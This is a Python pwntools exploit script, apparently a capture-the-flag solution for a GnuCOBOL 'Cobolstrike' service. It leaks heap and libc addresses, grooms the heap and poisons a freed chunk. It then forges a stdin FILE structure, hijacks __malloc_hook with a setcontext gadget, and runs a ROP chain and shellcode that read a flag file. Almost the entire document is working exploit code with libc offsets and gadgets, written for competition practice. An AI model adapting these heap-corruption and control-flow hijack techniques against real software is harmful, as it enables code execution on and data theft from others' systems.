from pwn import *
from IO_FILE import *

context.arch = 'amd64'

###Util
def fopen(fname,idx,size):
    r.sendlineafter(b'> \n',b'1')
    r.sendlineafter(b'Name: \n',fname)
    r.sendlineafter(b'Index: \n',str(idx).encode())
    r.sendlineafter(b'Size: \n',str(size).encode())

def show(idx):
    r.sendlineafter(b'> \n',b'2')
    r.sendlineafter(b'Index: \n',str(idx).encode())
    return r.recvuntil(b'-----------',drop=True)

def edit(idx,data):
    r.sendlineafter(b'> \n',b'2')
    r.sendlineafter(b'Index: \n',str(idx).encode())
    sleep(1)
    r.send(data)

def fclose(idx):
    r.sendlineafter(b'> \n',b'3')
    r.sendlineafter(b'Index: \n',str(idx).encode())

###Addr
#  libc2.32 (should work on 2.33 too?)
'''
free_offset = 0x97b70
free_hook_offset = 0x1e6e40
stdin_struct_offset = 0x1e39a0
malloc_hook_offset = 0x1e3b90
IO_str_jumps_offset = 0x1e5580
'''
#  originally written for libc2.32 long ago, porting to libc2.31 for docker support
free_offset = 0x9a6d0
free_hook_offset = 0x1eee48
stdin_struct_offset = 0x1ec980
malloc_hook_offset = 0x1ecb70
IO_str_jumps_offset = 0x1e9560

###ROPgadget
'''
L_nop = 0x363cf
L_pop_rdi = 0x2858f
L_pop_rsi = 0x2ac3f
L_pop_rdx_rbx = 0x1597d6
L_pop_rax = 0x45580
L_syscall = 0x611ea
set_context_gadget = 0x5306d
'''
#  originally written for libc2.32 long ago, porting to libc2.31 for docker support
L_nop = 0x319bf
L_pop_rdi = 0x23b6a
L_pop_rsi = 0x2601f
L_pop_rdx_rbx = 0x15fae6
L_pop_rax = 0x36174
L_syscall = 0x10e1f0
set_context_gadget = 0x54f5d

###Exploit
#r = process('./C', env={'LD_LIBRARY_PATH':'./'})
r = remote('127.0.0.1',10101)

fopen(b'NOTE',1,0xf8)
fopen(b'M30W',16,1)
leaks = show(1)
heap_addr = u64(leaks[0x108:0x110])-0x10
print(hex(heap_addr))
free_addr = u64(leaks[0x1b0:0x1b8])
libc_base = free_addr-free_offset
print(hex(libc_base))

fclose(1)

for i in range(5):
    fopen(b'NOTE',i+1,0x1f8)
for i in range(5):
    fclose(i+1)
for i in range(7):
    fopen(b'NOTE',i*2+1,0xff8)
    fopen(b'NOTE',i*2+2,0x408)
for i in range(7):
    fclose(i*2+2)
for i in range(7):
    fclose(i*2+1)

###Exhaust unsorted bin, there are 7 0x1000 + 1 0xd0 chunks now
fopen(b'NOTE',1,0xd0-0x60-8)
fclose(1)
DECOMPOSITE = ((3,(0x210,0x220,0x3e0,0x3f0,0x400)),
               (3,(0x260,0x260,0x3b0,0x3c0,0x3d0)),
               (1,(0x290,0x2c0,0x380,0x390,0x3a0)))
for i in range(3):
    for j in range(DECOMPOSITE[i][0]):
        for k in range(5):
            fopen(b'NOTE',j*5+k+1,DECOMPOSITE[i][1][k]-0x8)
    for k in range(DECOMPOSITE[i][0]*5):
        fclose(k+1)
###Unsorted bin cleared, except for 0x60 chunk that is allocated on every input
###Exhaust top chunk
for i in range(6):
    fopen(b'NOTE',i+3,0xfff)
###Top chunk exhausted to less than one page
###One chunk for fine tuning
fopen(b'NOTE',9,0x420-0x2e0-0xd0-0x20-8)
fopen(b'NOTE',1,0xc8)    #master used for modifying the next chunk
fopen(b'NOTE',12,0x2d8)  #slave for modification, this is the last chunk before end of heap (expect 0x20 postfence)
###Cleanup
for i in range(7):
    fclose(i+3)
fopen(b'NOTE',3,0x2d8)
fclose(3)
###Prepare for fd overflow, adjust to make the target open below fd = 256
for i in range(0xcb):
    print(f'{i} / {0xcb}')
    fopen(b'NOTE',4,1)
    fopen(b'M30W',3,1)
    fclose(4)
fclose(1)
fopen(b'NOTE',4,1)
fopen(b'NOTE',1,0xc8)   #this should be fd 256
fopen(b'M30W',16,1)
fclose(12)

###Modify free chunk
'''
edit(1,b'\x00'*0xb8+p64(0x2e1)+\
       p64((libc_base+stdin_struct_offset-0x50)^((heap_addr+0x20d10)>>12))+p64(0)+\
       b'\x00'*0x2d8+p64(0x21)+\
       b'\x00'*0x11)
'''
#No heap ptr mangling on 2.31
edit(1,b'\x00'*0xc8+p64(0x2e1)+\
       p64(libc_base+stdin_struct_offset-0x50)+p64(0)+\
       b'\x00'*0x2d8+p64(0x21)+\
       b'\x00'*0x11)
r.sendlineafter(b'> \n',b'')
fclose(1)

fopen(b'NOTE',5,0x2d8)
fopen(b'NOTE',1,0x2d8)

###at heap offset 0x6a0 is a meta structure used by cobol, this contains flags regarding 
###whether to call cob_resolve_cobol and resolve functions
###The structure is only editable after getting arb malloc, but idk how to use it atm
###Additionally, the cached call table(for resolved function) is on heap, meaning that if we can modify it, it's game over
###The distance if quite far and requires at least two modifications tho(can't do it here)
###trace https://gnucobol.sourceforge.io/doxygen/gnucobol-2/call_8c.html#a11b03714f3768284c0e7cc97563d635a (and cobc codegen.c) for details
###Additionally, compiling with cobc -C gives the c code directly, thus lifting need to rev

###I'm doing a file attack here, but this might not be necessary, (e.g. if you can find a one_gadget that works...)
###Modify the entire IO_stdin file structure then shutdown to fail read()
###The following cob_accept will call getc, which tries to read from stdin stream

argument = b'/home/Cobolstrike/flag\x00'.ljust(0x50,b'\x00')
IO_file = IO_FILE_plus(arch=64)
stream = IO_file.construct(flags = 0xfbad2082,
                           read_end = 0,
                           write_base = 0, write_ptr = libc_base+malloc_hook_offset-0x110-0xa0,
                           buf_end = 0xe8000000, buf_base = 0x0,
                           fileno = 0,
                           lock = libc_base+stdin_struct_offset-0x20,
                           mode = 0xffffffff,
                           vtable = libc_base+IO_str_jumps_offset-0x10)

hijacked_malloc_hook = p64(libc_base+set_context_gadget)
stub = p64(libc_base+malloc_hook_offset-0x110+0x10)+p64(libc_base+L_nop)
ROPchain = p64(libc_base+L_pop_rdi)+p64((libc_base+stdin_struct_offset)&0xfffffffffffff000)+\
           p64(libc_base+L_pop_rsi)+p64(0x2000)+\
           p64(libc_base+L_pop_rdx_rbx)+p64(7)+p64(0)+\
           p64(libc_base+L_pop_rax)+p64(10)+\
           p64(libc_base+L_syscall)+\
           p64(libc_base+malloc_hook_offset-0x110+0x68)

shellcode = asm(f'''
                 mov rdi, {libc_base+stdin_struct_offset-0x50}
                 mov rsi, 0
                 mov rdx, 0
                 mov rax, 2
                 syscall
                 mov rdi, rax
                 mov rsi, {libc_base+stdin_struct_offset-0x50}
                 mov rdx, 0x100
                 mov rax, 0
                 syscall
                 mov rdi, 1
                 mov rsi, {libc_base+stdin_struct_offset-0x50}
                 mov rdx, 0x100
                 mov rax, 1
                 syscall
                 mov rdi, 0
                 mov rax, 0x3c
                 syscall
                 ''')
payload = argument+stream+(stub+ROPchain+shellcode).ljust(0x110,b'\x00')+hijacked_malloc_hook
edit(1,payload)
r.shutdown()
r.interactive()
